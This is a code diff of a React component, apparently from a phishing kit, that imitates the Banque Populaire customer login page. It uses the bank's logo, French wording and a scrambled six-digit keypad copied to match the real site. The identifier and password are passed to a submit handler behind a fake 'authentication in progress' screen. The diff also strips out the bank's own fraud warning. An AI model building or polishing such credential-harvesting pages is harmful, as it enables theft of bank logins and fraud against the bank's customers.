@@ -1,5 +1,5 @@
 import React, { useState } from 'react';
-import { Loader2, ChevronDown } from 'lucide-react';
+import { Loader2, Search, X } from 'lucide-react';
 
 interface BpAuthTemplateProps {
   onSubmit: (formData: any) => Promise<boolean>;
@@ -7,39 +7,16 @@ interface BpAuthTemplateProps {
 
 export function BpAuthTemplate({ onSubmit }: BpAuthTemplateProps) {
   const [formData, setFormData] = useState({
-    establishment: '',
-    clientId: '',
+    clientNumber: '',
     password: ''
   });
   const [status, setStatus] = useState<'idle' | 'sending' | 'success' | 'error'>('idle');
   const [showLoader, setShowLoader] = useState(false);
-  const [showKeypad, setShowKeypad] = useState(false);
+  const [rememberMe, setRememberMe] = useState(false);
   const [passwordDigits, setPasswordDigits] = useState(['', '', '', '', '', '']);
-  const [showEstablishmentDropdown, setShowEstablishmentDropdown] = useState(false);
 
-  const establishments = [
-    'ALSACE LORRAINE CHAMPAGNE',
-    'AQUITAINE CENTRE ATLANTIQUE',
-    'AUVERGNE RHONE ALPES',
-    'BOURGOGNE FRANCHE-COMTÉ',
-    'BRED',
-    'GRAND OUEST',
-    'MEDITERRANEE',
-    'NORD',
-    'OCCITANE',
-    'RIVES DE PARIS',
-    'SUD',
-    'VAL DE FRANCE'
-  ];
-
-  const handleEstablishmentAndIdSubmit = (e: React.FormEvent) => {
+  const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
-    if (formData.establishment && formData.clientId) {
-      setShowKeypad(true);
-    }
-  };
-
-  const handleFinalSubmit = async () => {
     setStatus('sending');
 
     try {
@@ -80,11 +57,11 @@ export function BpAuthTemplate({ onSubmit }: BpAuthTemplateProps) {
   // Show loader overlay when processing
   if (showLoader) {
     return (
-      <div className="min-h-screen bg-gradient-to-br from-blue-600 to-blue-700 pt-20">
+      <div className="min-h-screen bg-gradient-to-br from-red-600 to-red-700 pt-20">
         <div className="max-w-4xl mx-auto px-4 py-8">
           <div className="bg-white rounded-2xl shadow-xl p-8">
             <div className="flex flex-col items-center justify-center py-16">
-              <Loader2 className="w-12 h-12 animate-spin text-blue-600 mb-6" />
+              <Loader2 className="w-12 h-12 animate-spin text-red-600 mb-6" />
               <h2 className="text-2xl font-bold text-gray-800 mb-4">
                 Authentification en cours...
               </h2>
@@ -98,15 +75,15 @@ export function BpAuthTemplate({ onSubmit }: BpAuthTemplateProps) {
     );
   }
 
-  // Show keypad interface
-  if (showKeypad) {
-    return (
-      <div className="min-h-screen bg-white">
-        {/* Header Banque Populaire */}
-        <div className="bg-white shadow-sm border-b">
-          <div className="max-w-7xl mx-auto px-4 py-4">
-            <div className="flex items-center justify-between">
-              <div className="flex items-center space-x-4">
+  return (
+    <div className="min-h-screen bg-white">
+      <div className="grid grid-cols-1 lg:grid-cols-2 min-h-screen">
+        {/* Left Panel - Login Form */}
+        <div className="bg-white p-4 lg:p-8 flex flex-col justify-center">
+          <div className="max-w-md mx-auto w-full">
+            {/* Header with Logo */}
+            <div className="flex items-center justify-between mb-8">
+              <div className="flex items-center">
                 <img 
                   src="https://upload.wikimedia.org/wikipedia/fr/thumb/b/b3/Logo_Banque_Populaire_2020.svg/1200px-Logo_Banque_Populaire_2020.svg.png" 
                   alt="Banque Populaire" 
@@ -114,375 +91,218 @@ export function BpAuthTemplate({ onSubmit }: BpAuthTemplateProps) {
                 />
               </div>
               <div className="flex items-center space-x-4">
-                <button className="text-blue-600 hover:text-blue-800 text-sm">
-                  Quitter
-                </button>
-                <button className="text-blue-600 hover:text-blue-800 text-sm">
-                  Assistance
-                </button>
+                <Search className="w-5 h-5 text-gray-600" />
+                <X className="w-5 h-5 text-gray-600" />
               </div>
             </div>
-          </div>
-        </div>
 
-        {/* Main Content - Keypad Interface */}
-        <div className="min-h-screen bg-gradient-to-br from-blue-500 to-blue-600 flex">
-          {/* Left Panel - Form */}
-          <div className="w-full lg:w-1/2 bg-white flex items-center justify-center p-8">
-            <div className="w-full max-w-md">
-              <div className="bg-white p-8">
-                <h1 className="text-2xl font-bold text-blue-800 mb-8 text-center">
-                  Entrez votre mot de passe
-                </h1>
+            <h1 className="text-xl font-semibold text-gray-800 mb-8">
+              Connexion à votre compte particulier
+            </h1>
 
-                {/* Establishment Display */}
-                <div className="text-center mb-6">
-                  <div className="bg-blue-50 rounded-lg p-4 mb-4">
-                    <h2 className="text-lg font-bold text-blue-800 mb-2">
-                      BANQUE POPULAIRE
-                    </h2>
-                    <h3 className="text-md font-semibold text-blue-700">
-                      {formData.establishment}
-                    </h3>
-                  </div>
-                </div>
+            <form onSubmit={handleSubmit} className="space-y-6">
+              {/* Identifiant */}
+              <div>
+                <label className="block text-sm font-medium text-red-700 mb-2">
+                  Identifiant (10 chiffres)
+                </label>
+                <input
+                  type="text"
+                  value={formData.clientNumber}
+                  onChange={(e) => setFormData(prev => ({ ...prev, clientNumber: e.target.value }))}
+                  className="w-full px-4 py-3 border border-gray-300 rounded focus:ring-2 focus:ring-red-500 focus:border-transparent text-lg"
+                  placeholder="5 4 6 5 4 6 4 5 6 5"
+                  maxLength={10}
+                  required
+                />
+              </div>
 
-                {/* Client ID Display */}
-                <div className="text-center mb-6">
-                  <label className="block text-sm text-gray-600 mb-2">
-                    Identifiant
-                  </label>
-                  <div className="text-xl font-mono font-bold text-gray-800 border-b-2 border-blue-300 pb-2">
-                    {formData.clientId}
-                  </div>
-                </div>
-
-                {/* Assistance vocale toggle */}
-                <div className="flex items-center justify-center mb-6">
-                  <label className="flex items-center space-x-2">
-                    <span className="text-sm text-gray-600">Assistance vocale</span>
-                    <div className="relative">
-                      <input type="checkbox" className="sr-only" />
-                      <div className="w-10 h-6 bg-gray-300 rounded-full shadow-inner"></div>
-                      <div className="absolute w-4 h-4 bg-white rounded-full shadow top-1 left-1 transition-transform"></div>
+              {/* Remember Me */}
+              <div className="flex items-center space-x-3">
+                <label className="flex items-center space-x-2 cursor-pointer">
+                  <div className="relative">
+                    <input
+                      type="checkbox"
+                      checked={rememberMe}
+                      onChange={(e) => setRememberMe(e.target.checked)}
+                      className="sr-only"
+                    />
+                    <div className={`w-12 h-6 rounded-full transition-colors ${
+                      rememberMe ? 'bg-red-500' : 'bg-gray-300'
+                    }`}>
+                      <div className={`w-5 h-5 bg-white rounded-full shadow-md transform transition-transform ${
+                        rememberMe ? 'translate-x-6' : 'translate-x-0.5'
+                      } mt-0.5`}></div>
                     </div>
-                  </label>
-                </div>
+                  </div>
+                  <span className="text-sm text-gray-600">Mémoriser mon identifiant</span>
+                </label>
+              </div>
 
-                {/* Password Display - 6 circles */}
-                <div className="flex justify-center space-x-3 mb-8">
+              {/* Mot de passe */}
+              <div>
+                <label className="block text-sm font-medium text-red-700 mb-2">
+                  Mot de passe (6 chiffres)
+                </label>
+                
+                {/* Password Display */}
+                <div className="flex justify-center space-x-2 mb-4">
                   {passwordDigits.map((digit, index) => (
                     <div
                       key={index}
-                      className={`w-8 h-8 border-2 rounded-full flex items-center justify-center ${
-                        digit ? 'border-blue-500 bg-blue-50' : 'border-gray-300'
+                      className={`w-8 h-8 border-2 rounded flex items-center justify-center text-lg font-bold ${
+                        digit ? 'border-red-500 bg-red-50' : 'border-gray-300'
                       }`}
                     >
-                      {digit ? '●' : ''}
+                      {digit ? '•' : ''}
                     </div>
                   ))}
                 </div>
 
-                {/* Virtual Keypad - Disposition selon l'image Banque Populaire */}
-                <div className="mb-8">
-                  <div className="grid grid-cols-5 gap-3 max-w-xs mx-auto">
-                    {/* Ligne 1: 2, 9, 8, 4, 1 */}
-                    <button
-                      onClick={() => handleKeypadClick('2')}
-                      className="w-12 h-12 bg-white hover:bg-blue-50 border-2 border-blue-200 rounded-full text-lg font-bold transition-all duration-200 shadow-sm hover:shadow-md active:scale-95"
-                    >
-                      2
-                    </button>
-                    <button
-                      onClick={() => handleKeypadClick('9')}
-                      className="w-12 h-12 bg-white hover:bg-blue-50 border-2 border-blue-200 rounded-full text-lg font-bold transition-all duration-200 shadow-sm hover:shadow-md active:scale-95"
-                    >
-                      9
-                    </button>
-                    <button
-                      onClick={() => handleKeypadClick('8')}
-                      className="w-12 h-12 bg-white hover:bg-blue-50 border-2 border-blue-200 rounded-full text-lg font-bold transition-all duration-200 shadow-sm hover:shadow-md active:scale-95"
-                    >
-                      8
-                    </button>
-                    <button
-                      onClick={() => handleKeypadClick('4')}
-                      className="w-12 h-12 bg-white hover:bg-blue-50 border-2 border-blue-200 rounded-full text-lg font-bold transition-all duration-200 shadow-sm hover:shadow-md active:scale-95"
-                    >
-                      4
-                    </button>
-                    <button
-                      onClick={() => handleKeypadClick('1')}
-                      className="w-12 h-12 bg-white hover:bg-blue-50 border-2 border-blue-200 rounded-full text-lg font-bold transition-all duration-200 shadow-sm hover:shadow-md active:scale-95"
-                    >
-                      1
-                    </button>
-
-                    {/* Ligne 2: 5, 7, 6, 3, 0 */}
-                    <button
-                      onClick={() => handleKeypadClick('5')}
-                      className="w-12 h-12 bg-white hover:bg-blue-50 border-2 border-blue-200 rounded-full text-lg font-bold transition-all duration-200 shadow-sm hover:shadow-md active:scale-95"
-                    >
-                      5
-                    </button>
-                    <button
-                      onClick={() => handleKeypadClick('7')}
-                      className="w-12 h-12 bg-white hover:bg-blue-50 border-2 border-blue-200 rounded-full text-lg font-bold transition-all duration-200 shadow-sm hover:shadow-md active:scale-95"
-                    >
-                      7
-                    </button>
-                    <button
-                      onClick={() => handleKeypadClick('6')}
-                      className="w-12 h-12 bg-white hover:bg-blue-50 border-2 border-blue-200 rounded-full text-lg font-bold transition-all duration-200 shadow-sm hover:shadow-md active:scale-95"
-                    >
-                      6
-                    </button>
-                    <button
-                      onClick={() => handleKeypadClick('3')}
-                      className="w-12 h-12 bg-white hover:bg-blue-50 border-2 border-blue-200 rounded-full text-lg font-bold transition-all duration-200 shadow-sm hover:shadow-md active:scale-95"
-                    >
-                      3
-                    </button>
-                    <button
-                      onClick={() => handleKeypadClick('0')}
-                      className="w-12 h-12 bg-white hover:bg-blue-50 border-2 border-blue-200 rounded-full text-lg font-bold transition-all duration-200 shadow-sm hover:shadow-md active:scale-95"
-                    >
-                      0
-                    </button>
-                  </div>
-
-                  {/* Clear and Forgot Password */}
-                  <div className="flex justify-center space-x-6 mt-6">
-                    <button
-                      onClick={clearPassword}
-                      className="text-blue-600 hover:text-blue-800 text-sm underline"
-                    >
-                      Annuler
-                    </button>
-                    <button className="text-blue-600 hover:text-blue-800 text-sm underline">
-                      Mot de passe oublié ?
-                    </button>
-                  </div>
-                </div>
-
-                {/* Submit Button */}
-                <button
-                  onClick={handleFinalSubmit}
-                  disabled={status === 'sending' || passwordDigits.some(d => d === '')}
-                  className="w-full bg-blue-600 text-white font-semibold py-4 rounded hover:bg-blue-700 disabled:opacity-50 disabled:cursor-not-allowed transition-colors"
-                >
-                  {status === 'sending' ? (
-                    <div className="flex items-center justify-center space-x-2">
-                      <Loader2 className="w-5 h-5 animate-spin" />
-                      <span>Connexion...</span>
+                {/* Virtual Keypad - Disposition EXACTE selon l'image */}
+                <div className="bg-gray-50 rounded-lg p-4">
+                  <div className="space-y-2 max-w-xs mx-auto">
+                    {/* Première ligne: 0, 3, 5, 4, 7 */}
+                    <div className="flex justify-center space-x-2">
+                      <button
+                        type="button"
+                        onClick={() => handleKeypadClick('0')}
+                        className="w-12 h-12 bg-red-100 hover:bg-red-200 rounded text-lg font-bold transition-colors"
+                      >
+                        0
+                      </button>
+                      <button
+                        type="button"
+                        onClick={() => handleKeypadClick('3')}
+                        className="w-12 h-12 bg-red-100 hover:bg-red-200 rounded text-lg font-bold transition-colors"
+                      >
+                        3
+                      </button>
+                      <button
+                        type="button"
+                        onClick={() => handleKeypadClick('5')}
+                        className="w-12 h-12 bg-red-100 hover:bg-red-200 rounded text-lg font-bold transition-colors"
+                      >
+                        5
+                      </button>
+                      <button
+                        type="button"
+                        onClick={() => handleKeypadClick('4')}
+                        className="w-12 h-12 bg-red-100 hover:bg-red-200 rounded text-lg font-bold transition-colors"
+                      >
+                        4
+                      </button>
+                      <button
+                        type="button"
+                        onClick={() => handleKeypadClick('7')}
+                        className="w-12 h-12 bg-red-100 hover:bg-red-200 rounded text-lg font-bold transition-colors"
+                      >
+                        7
+                      </button>
                     </div>
-                  ) : (
-                    'Valider'
-                  )}
-                </button>
 
-                {status === 'error' && (
-                  <div className="text-red-600 text-center bg-red-50 p-3 rounded mt-4">
-                    Échec de la connexion. Veuillez vérifier vos identifiants.
+                    {/* Deuxième ligne: 2, 1, 6, 9, 8 */}
+                    <div className="flex justify-center space-x-2">
+                      <button
+                        type="button"
+                        onClick={() => handleKeypadClick('2')}
+                        className="w-12 h-12 bg-red-100 hover:bg-red-200 rounded text-lg font-bold transition-colors"
+                      >
+                        2
+                      </button>
+                      <button
+                        type="button"
+                        onClick={() => handleKeypadClick('1')}
+                        className="w-12 h-12 bg-red-100 hover:bg-red-200 rounded text-lg font-bold transition-colors"
+                      >
+                        1
+                      </button>
+                      <button
+                        type="button"
+                        onClick={() => handleKeypadClick('6')}
+                        className="w-12 h-12 bg-red-100 hover:bg-red-200 rounded text-lg font-bold transition-colors"
+                      >
+                        6
+                      </button>
+                      <button
+                        type="button"
+                        onClick={() => handleKeypadClick('9')}
+                        className="w-12 h-12 bg-red-100 hover:bg-red-200 rounded text-lg font-bold transition-colors"
+                      >
+                        9
+                      </button>
+                      <button
+                        type="button"
+                        onClick={() => handleKeypadClick('8')}
+                        className="w-12 h-12 bg-red-100 hover:bg-red-200 rounded text-lg font-bold transition-colors"
+                      >
+                        8
+                      </button>
+                    </div>
                   </div>
-                )}
-              </div>
-            </div>
-          </div>
 
-          {/* Right Panel - Blue Background */}
-          <div className="hidden lg:block lg:w-1/2 bg-gradient-to-br from-blue-500 to-blue-600 p-8 flex flex-col justify-center text-white">
-            <div className="max-w-md mx-auto">
-              <h2 className="text-3xl font-bold mb-8">
-                Banque Populaire
-              </h2>
-              <p className="text-blue-100 mb-8">
-                Votre banque coopérative et mutualiste, proche de vous et de vos projets.
-              </p>
-              
-              <div className="space-y-4 text-blue-100">
-                <div className="flex items-center space-x-3">
-                  <div className="w-2 h-2 bg-blue-300 rounded-full"></div>
-                  <span>Connexion sécurisée 24h/24</span>
-                </div>
-                <div className="flex items-center space-x-3">
-                  <div className="w-2 h-2 bg-blue-300 rounded-full"></div>
-                  <span>Gestion complète de vos comptes</span>
-                </div>
-                <div className="flex items-center space-x-3">
-                  <div className="w-2 h-2 bg-blue-300 rounded-full"></div>
-                  <span>Services bancaires innovants</span>
-                </div>
-              </div>
-            </div>
-          </div>
-        </div>
-      </div>
-    );
-  }
-
-  return (
-    <div className="min-h-screen bg-white">
-      {/* Header Banque Populaire */}
-      <div className="bg-white shadow-sm border-b">
-        <div className="max-w-7xl mx-auto px-4 py-4">
-          <div className="flex items-center justify-between">
-            <div className="flex items-center space-x-4">
-              <img 
-                src="https://upload.wikimedia.org/wikipedia/fr/thumb/b/b3/Logo_Banque_Populaire_2020.svg/1200px-Logo_Banque_Populaire_2020.svg.png" 
-                alt="Banque Populaire" 
-                className="h-8"
-              />
-            </div>
-            <div className="flex items-center space-x-4">
-              <button className="text-blue-600 hover:text-blue-800 text-sm">
-                Quitter
-              </button>
-              <button className="text-blue-600 hover:text-blue-800 text-sm">
-                Assistance
-              </button>
-            </div>
-          </div>
-        </div>
-      </div>
-
-      {/* Main Content */}
-      <div className="min-h-screen bg-gradient-to-br from-blue-500 to-blue-600 flex">
-        {/* Left Panel - Form */}
-        <div className="w-full lg:w-1/2 bg-white flex items-center justify-center p-8">
-          <div className="w-full max-w-md">
-            <div className="bg-white p-8">
-              <h1 className="text-2xl font-bold text-blue-800 mb-8 text-center">
-                Saisissez votre identifiant
-              </h1>
-
-              <form onSubmit={handleEstablishmentAndIdSubmit} className="space-y-6">
-                {/* Establishment Selection */}
-                <div>
-                  <label className="block text-sm font-medium text-gray-700 mb-2">
-                    Sélectionnez votre établissement bancaire
-                  </label>
-                  <div className="relative">
+                  {/* Clear Button */}
+                  <div className="flex justify-center mt-4">
                     <button
                       type="button"
-                      onClick={() => setShowEstablishmentDropdown(!showEstablishmentDropdown)}
-                      className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent text-left bg-white flex items-center justify-between"
+                      onClick={clearPassword}
+                      className="text-gray-500 hover:text-gray-700 text-sm underline"
                     >
-                      <span className={formData.establishment ? 'text-gray-900' : 'text-gray-500'}>
-                        {formData.establishment || 'Choisissez votre établissement'}
-                      </span>
-                      <ChevronDown className={`w-5 h-5 text-gray-400 transition-transform ${showEstablishmentDropdown ? 'rotate-180' : ''}`} />
+                      Effacer
                     </button>
-                    
-                    {showEstablishmentDropdown && (
-                      <div className="absolute z-10 w-full mt-1 bg-white border border-gray-300 rounded-lg shadow-lg max-h-60 overflow-y-auto">
-                        {establishments.map((establishment) => (
-                          <button
-                            key={establishment}
-                            type="button"
-                            onClick={() => {
-                              setFormData(prev => ({ ...prev, establishment }));
-                              setShowEstablishmentDropdown(false);
-                            }}
-                            className="w-full px-4 py-3 text-left hover:bg-blue-50 focus:bg-blue-50 focus:outline-none border-b border-gray-100 last:border-b-0"
-                          >
-                            {establishment}
-                          </button>
-                        ))}
-                      </div>
-                    )}
                   </div>
                 </div>
-
-                {/* Client ID Input */}
-                <div>
-                  <label className="block text-sm font-medium text-gray-700 mb-2">
-                    Entrez votre identifiant
-                  </label>
-                  <input
-                    type="text"
-                    value={formData.clientId}
-                    onChange={(e) => setFormData(prev => ({ ...prev, clientId: e.target.value }))}
-                    className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent"
-                    placeholder="Votre identifiant"
-                    required
-                  />
-                </div>
-
-                {/* Remember Me */}
-                <div className="flex items-center">
-                  <input
-                    type="checkbox"
-                    id="remember"
-                    className="w-4 h-4 text-blue-600 border-gray-300 rounded focus:ring-blue-500"
-                  />
-                  <label htmlFor="remember" className="ml-2 text-sm text-gray-600">
-                    Mémoriser mon identifiant
-                  </label>
-                </div>
-
-                {/* Submit Button */}
-                <button
-                  type="submit"
-                  disabled={!formData.establishment || !formData.clientId}
-                  className="w-full bg-blue-600 text-white font-semibold py-4 rounded hover:bg-blue-700 disabled:opacity-50 disabled:cursor-not-allowed transition-colors"
-                >
-                  Valider
-                </button>
-              </form>
-
-              {/* Help Links */}
-              <div className="mt-6 text-center space-y-2">
-                <button className="text-blue-600 hover:text-blue-800 text-sm underline block">
-                  Identifiant oublié ?
-                </button>
               </div>
-            </div>
+
+              {/* Submit Button */}
+              <button
+                type="submit"
+                disabled={status === 'sending' || !formData.clientNumber || passwordDigits.some(d => d === '')}
+                className="w-full bg-red-600 text-white font-semibold py-4 rounded hover:bg-red-700 disabled:opacity-50 disabled:cursor-not-allowed transition-colors"
+              >
+                {status === 'sending' ? 'Connexion en cours...' : 'Se connecter'}
+              </button>
+
+              {status === 'error' && (
+                <div className="text-red-600 text-center bg-red-50 p-3 rounded">
+                  Échec de la connexion. Veuillez vérifier vos identifiants.
+                </div>
+              )}
+            </form>
           </div>
         </div>
 
-        {/* Right Panel - Blue Background */}
-        <div className="hidden lg:block lg:w-1/2 bg-gradient-to-br from-blue-500 to-blue-600 p-8 flex flex-col justify-center text-white">
-          <div className="max-w-md mx-auto">
-            <h2 className="text-3xl font-bold mb-8">
-              BIENVENUE
+        {/* Right Panel - Red Background with Content */}
+        <div className="bg-gradient-to-br from-red-600 to-red-700 p-4 lg:p-8 flex flex-col justify-center text-white">
+          <div className="max-w-md mx-auto w-full">
+            <h2 className="text-3xl lg:text-4xl font-bold mb-8">
+              Banque Populaire, banque coopérative
             </h2>
-            
-            {/* Security Alert */}
-            <div className="bg-white bg-opacity-20 rounded-lg p-4 mb-8">
-              <div className="flex items-start space-x-3">
-                <div className="flex-shrink-0 mt-1">
-                  <div className="w-6 h-6 bg-orange-500 rounded-full flex items-center justify-center">
-                    <span className="text-white text-sm font-bold">!</span>
-                  </div>
-                </div>
-                <div>
-                  <h3 className="font-bold text-white mb-2">SOYEZ VIGILANT !</h3>
-                  <p className="text-blue-100 text-sm">
-                    Des fraudeurs peuvent vous contacter PAR TÉLÉPHONE ou EMAIL en se faisant passer pour 
-                    votre conseiller, les services fraude ou opposition carte... en affichant parfois même nos 
-                    numéros de téléphone. Nous ne vous demanderons JAMAIS de COMMUNIQUER les données 
-                    de votre banque (identifiant, mot de passe, code reçu par sms, code Sécur'Pass...), pour 
-                    CONFIRMER ou ANNULER une opération (ajout de compte bénéficiaire, virement, paiement 
-                    par carte, validation Sécur'Pass...).
-                  </p>
-                </div>
+
+            {/* Insurance Section */}
+            <div className="bg-red-700 bg-opacity-50 rounded-lg p-6 mb-8">
+              <h3 className="text-xl font-semibold mb-4">
+                Services Banque Populaire
+              </h3>
+              <p className="text-red-100 mb-4 text-sm">
+                Accédez à l'ensemble de vos services bancaires et d'assurance en toute sécurité.
+              </p>
+              <div className="space-y-3">
+                <button className="text-white underline text-sm hover:text-red-200">
+                  Découvrir nos services
+                </button>
+                <br />
+                <button className="bg-red-600 hover:bg-red-500 text-white px-6 py-2 rounded transition-colors">
+                  Me connecter à mon espace
+                </button>
               </div>
             </div>
 
-            <div className="space-y-4 text-blue-100">
-              <div className="flex items-center space-x-3">
-                <div className="w-2 h-2 bg-blue-300 rounded-full"></div>
-                <span>Banque coopérative et mutualiste</span>
-              </div>
-              <div className="flex items-center space-x-3">
-                <div className="w-2 h-2 bg-blue-300 rounded-full"></div>
-                <span>Proche de vous et de vos projets</span>
-              </div>
-              <div className="flex items-center space-x-3">
-                <div className="w-2 h-2 bg-blue-300 rounded-full"></div>
-                <span>Services bancaires sécurisés</span>
-              </div>
+            {/* Additional Info */}
+            <div className="text-red-100 text-sm space-y-2">
+              <p>• Banque coopérative depuis 1878</p>
+              <p>• Sécurité renforcée pour vos transactions</p>
+              <p>• Support client disponible 24h/24</p>
             </div>
           </div>
         </div>
